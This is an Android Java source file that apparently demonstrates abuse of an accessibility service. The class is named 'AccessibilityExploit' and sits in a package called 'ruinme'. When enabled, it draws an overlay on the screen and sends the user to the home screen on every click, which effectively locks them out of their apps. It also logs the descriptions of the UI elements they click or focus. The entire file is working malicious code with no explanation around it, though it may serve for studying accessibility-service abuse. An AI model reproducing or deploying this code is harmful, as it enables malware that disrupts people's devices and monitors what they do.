package com.example.ruinme;
import android.accessibilityservice.AccessibilityService;
import android.graphics.PixelFormat;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import android.widget.FrameLayout;
import android.widget.ImageView;


public class AccessibilityExploit extends AccessibilityService {
    FrameLayout overLayout;
    int num_clicks = 0;
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                eventText = "Clicked: ";
                performGlobalAction (GLOBAL_ACTION_HOME);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                eventText = "Focused: ";
                break;
        }
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) {
            return;
        }

        eventText = eventText + event.getContentDescription();
        Log.d("AccessibilityExploit",eventText);

    }
    @Override
    protected void onServiceConnected()
    {
        annoyingOverlay();
    }

    @Override
    public void onInterrupt() {
    }
    public void annoyingOverlay()
    {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        overLayout = new FrameLayout(this);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        lp.flags |= WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        lp.gravity = Gravity.TOP;
        LayoutInflater inflater = LayoutInflater.from(this);
        inflater.inflate(R.layout.annoying_overlay, overLayout);
        wm.addView(overLayout, lp);


    }
}
